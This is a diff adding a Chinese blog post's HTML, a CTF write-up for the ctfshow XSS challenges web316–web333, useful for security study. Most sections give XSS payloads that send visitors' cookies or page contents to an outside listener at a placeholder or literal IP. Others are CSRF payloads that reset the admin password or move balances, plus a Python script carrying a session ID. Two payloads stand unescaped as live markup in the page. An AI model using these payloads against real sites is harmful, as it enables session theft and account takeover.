@@ -1,0 +1,167 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="ctfshow XSS跨站脚本注入漏洞 web316-web333       做题过程要用到的平台https:&#x2F;&#x2F;xss.pt&#x2F;，创建账号，好多playload，在项目管理了可看到flag                     web316       用平台上pLAYload怎么是都是有no admin，很奇怪，看到网上用服务器监听，我也监听了，就是说">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ctfshow XSS跨站脚本注入漏洞 Web316-Web333">
+<meta property="og:url" content="https://qingchuana.github.io/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/index.html">
+<meta property="og:site_name" content="晴川&#39;s Blog">
+<meta property="og:description" content="ctfshow XSS跨站脚本注入漏洞 web316-web333       做题过程要用到的平台https:&#x2F;&#x2F;xss.pt&#x2F;，创建账号，好多playload，在项目管理了可看到flag                     web316       用平台上pLAYload怎么是都是有no admin，很奇怪，看到网上用服务器监听，我也监听了，就是说">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qingchuana.github.io/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/AAwangzhan/1/hexoblog/source/image/image-20230916150656330.png">
+<meta property="og:image" content="d:\AAwangzhan\1\hexoblog\source\image\image-20230916171228602.png">
+<meta property="og:image" content="d:\AAwangzhan\1\hexoblog\source\image\image-20230916171325595.png">
+<meta property="article:published_time" content="2023-09-18T07:43:43.000Z">
+<meta property="article:modified_time" content="2023-11-12T09:20:50.823Z">
+<meta property="article:author" content="Qingchuan">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qingchuana.github.io/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/AAwangzhan/1/hexoblog/source/image/image-20230916150656330.png"><title>Ctfshow XSS跨站脚本注入漏洞 Web316-Web333 | 晴川's Blog</title><link ref="canonical" href="https://qingchuana.github.io/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hello Stun</div><div class="header-banner-info__subtitle">An elegant theme for Hexo</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Ctfshow XSS跨站脚本注入漏洞 Web316-Web333</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-09-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body">
+        <h1 id="ctfshow-XSS跨站脚本注入漏洞-web316-web333">
+          <a href="#ctfshow-XSS跨站脚本注入漏洞-web316-web333" class="heading-link"><i class="fas fa-link"></i></a><a href="#ctfshow-XSS跨站脚本注入漏洞-web316-web333" class="headerlink" title="ctfshow XSS跨站脚本注入漏洞 web316-web333"></a>ctfshow XSS跨站脚本注入漏洞 web316-web333</h1>
+      <p>做题过程要用到的平台<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://xss.pt/%EF%BC%8C%E5%88%9B%E5%BB%BA%E8%B4%A6%E5%8F%B7%EF%BC%8C%E5%A5%BD%E5%A4%9Aplayload%EF%BC%8C%E5%9C%A8%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E4%BA%86%E5%8F%AF%E7%9C%8B%E5%88%B0flag">https://xss.pt/，创建账号，好多playload，在项目管理了可看到flag</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="web316">
+          <a href="#web316" class="heading-link"><i class="fas fa-link"></i></a><a href="#web316" class="headerlink" title="web316"></a>web316</h2>
+      <p>用平台上pLAYload怎么是都是有no admin，很奇怪，看到网上用服务器监听，我也监听了，就是说，为啥还是</p>
+<p><img src="/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/AAwangzhan\1\hexoblog\source\image\image-20230916150656330.png"></p>
+<p>服啦</p>
+<p>最后用自己服务器传入</p>
+<script>location.href="http://ip:39543/"+document.cookie</script>
+
+<p>服务器python3 -m http.server 39543可得到flag</p>
+
+        <h2 id="web317">
+          <a href="#web317" class="heading-link"><i class="fas fa-link"></i></a><a href="#web317" class="headerlink" title="web317"></a>web317</h2>
+      <p>原理同上，<script>被过滤,换成img</p>
+<img src='' onerror="location.href='http://ip:39543/'+document.cookie">
+
+
+        <h2 id="web318"   >
+          <a href="#web318" class="heading-link"><i class="fas fa-link"></i></a><a href="#web318" class="headerlink" title="web318"></a>web318</h2>
+      <p>换iframe标签</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=document.location=&#x27;http://ip:39543/?cookie=&#x27;+document.cookie&gt;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="web319"   >
+          <a href="#web319" class="heading-link"><i class="fas fa-link"></i></a><a href="#web319" class="headerlink" title="web319"></a>web319</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=window.open(&#x27;http://123.57.236.154:39543/?cookie=&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="web320"   >
+          <a href="#web320" class="heading-link"><i class="fas fa-link"></i></a><a href="#web320" class="headerlink" title="web320"></a>web320</h2>
+      <p>过滤了空格</p>
+<blockquote>
+<p>绕过方法：</p>
+<p>TAB</p>
+<p>/</p>
+<p>/**/</p>
+</blockquote>
+<p>上一题playload需要简单变换一下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe/onload=window.open(&#x27;http://123.57.236.154:39543/?cookie=&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>利用String.fromCharCode来进行转换</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,46,115,98,47,49,66,113,117,62,60,47,115,67,114,73,112,84,62));&gt;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="web321"   >
+          <a href="#web321" class="heading-link"><i class="fas fa-link"></i></a><a href="#web321" class="headerlink" title="web321"></a>web321</h2>
+      <p>iframe仍然可以</p>
+
+        <h2 id="web322"   >
+          <a href="#web322" class="heading-link"><i class="fas fa-link"></i></a><a href="#web322" class="headerlink" title="web322"></a>web322</h2>
+      <p>iframe仍然可以</p>
+
+        <h2 id="web323"   >
+          <a href="#web323" class="heading-link"><i class="fas fa-link"></i></a><a href="#web323" class="headerlink" title="web323"></a>web323</h2>
+      <p>iframe仍然可以</p>
+
+        <h2 id="web324"   >
+          <a href="#web324" class="heading-link"><i class="fas fa-link"></i></a><a href="#web324" class="headerlink" title="web324"></a>web324</h2>
+      <p>这次过滤了iframe</p>
+<p>我不知道用啥了。。。。</p>
+<p>看了大佬的wp，用svg还可以绕过</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=window.open(&#x27;http://123.57.236.154:39543/?cookie=&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="web325"   >
+          <a href="#web325" class="heading-link"><i class="fas fa-link"></i></a><a href="#web325" class="headerlink" title="web325"></a>web325</h2>
+      <p>svg仍可</p>
+
+        <h2 id="web326"   >
+          <a href="#web326" class="heading-link"><i class="fas fa-link"></i></a><a href="#web326" class="headerlink" title="web326"></a>web326</h2>
+      <p>svg可</p>
+
+        <h2 id="web327"   >
+          <a href="#web327" class="heading-link"><i class="fas fa-link"></i></a><a href="#web327" class="headerlink" title="web327"></a>web327</h2>
+      <p>到存储型xss</p>
+<p>盲猜上一题playload可以</p>
+<p>果然，可以</p>
+<p>当然也可以：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=window.open(&#x27;http://123.57.236.154::39543/&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="web328"   >
+          <a href="#web328" class="heading-link"><i class="fas fa-link"></i></a><a href="#web328" class="headerlink" title="web328"></a>web328</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://123.57.236.154:39543/&#x27;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>先注册，密码就是上面的xss，之后我们会在服务器获取到管理员的phpsession</p>
+<p><img src="D:\AAwangzhan\1\hexoblog\source\image\image-20230916171228602.png" alt="image-20230916171228602"></p>
+<p>之后将浏览器PHPsession改成监听到的，查看用户管理，可得到flag</p>
+<p><img src="D:\AAwangzhan\1\hexoblog\source\image\image-20230916171325595.png"></p>
+
+        <h2 id="web329"   >
+          <a href="#web329" class="heading-link"><i class="fas fa-link"></i></a><a href="#web329" class="headerlink" title="web329"></a>web329</h2>
+      <p>这次cookie不持久，所以就直接获取页面信息，通过document来获取</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://123.57.236.154:39543/&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>可直接监听到flag</p>
+
+        <h2 id="web330"   >
+          <a href="#web330" class="heading-link"><i class="fas fa-link"></i></a><a href="#web330" class="headerlink" title="web330"></a>web330</h2>
+      <p>注册时用户名为</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://127.0.0.1/api/change.php?p=123456&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>密码随便，将admin密码改为123456</p>
+<p>等待一会登录admin，密码为123456</p>
+
+        <h2 id="web331"   >
+          <a href="#web331" class="heading-link"><i class="fas fa-link"></i></a><a href="#web331" class="headerlink" title="web331"></a>web331</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&quot;api/change.php&quot;,method:&quot;POST&quot;,data:&#123;&#x27;p&#x27;:&#x27;1234567&#x27;&#125;&#125;)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>换了post传参方法。原理同上</p>
+
+        <h2 id="web332"   >
+          <a href="#web332" class="heading-link"><i class="fas fa-link"></i></a><a href="#web332" class="headerlink" title="web332"></a>web332</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script&gt;$.ajax(&#123;url: &quot;http://127.0.0.1/api/amount.php&quot;,method: &quot;POST&quot;,data: &#123;&#x27;u&#x27;=&#x27;gylq&#x27;,&#x27;a&#x27;:10000&#125;,cache: false,success: function(res)&#123;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>给admin账户设置为10000</p>
+<p>注册上先，登录。给admin转-10000，在购买flag</p>
+
+        <h2 id="web333"   >
+          <a href="#web333" class="heading-link"><i class="fas fa-link"></i></a><a href="#web333" class="headerlink" title="web333"></a>web333</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">x=5</span><br><span class="line">url=&quot;http://274ff6c1-4707-4493-90e6-f0bddae37424.challenge.ctf.show/api/amount.php&quot;</span><br><span class="line">url2=&quot;http://274ff6c1-4707-4493-90e6-f0bddae37424.challenge.ctf.show/api/getFlag.php&quot;</span><br><span class="line">headers=&#123;&#x27;Cookie&#x27;:&#x27;PHPSESSID=2og1nbla83d4tkt7qiksqjvdpl&#x27;&#125;  #自己登录后的sessionid</span><br><span class="line">while True:</span><br><span class="line">   print(x)</span><br><span class="line">   t=x-1</span><br><span class="line">   data=&#123;</span><br><span class="line">   &#x27;u&#x27;:&#x27;111&#x27;, #注册的用户名</span><br><span class="line">   &#x27;a&#x27;:str(t)</span><br><span class="line">   &#125;</span><br><span class="line">   r=requests.post(url,headers=headers,data=data)</span><br><span class="line">   print(r.text)</span><br><span class="line">   if(x&gt;10000):</span><br><span class="line">      r2=requests.get(url2,headers=headers)</span><br><span class="line">      print(r2.text)</span><br><span class="line">      break</span><br><span class="line">   x+=t</span><br></pre></td></tr></table></div></figure></script></p></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://qingchuana.github.io">Qingchuan</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://qingchuana.github.io/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/">https://qingchuana.github.io/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://qingchuana.github.io/tags/CTF/">CTF</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/09/20/Docker%20file%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Docker File 的基本操作</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/09/10/SICTF-2nd/"><span class="paginator-prev__text">SICTF-2nd</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-web316-web333"><span class="toc-number">1.</span> <span class="toc-text">
+          ctfshow XSS跨站脚本注入漏洞 web316-web333</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web316"><span class="toc-number">1.1.</span> <span class="toc-text">
+          web316</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web317"><span class="toc-number">1.2.</span> <span class="toc-text">
+          web317</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">Hello Stun</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">36</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Qingchuan</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
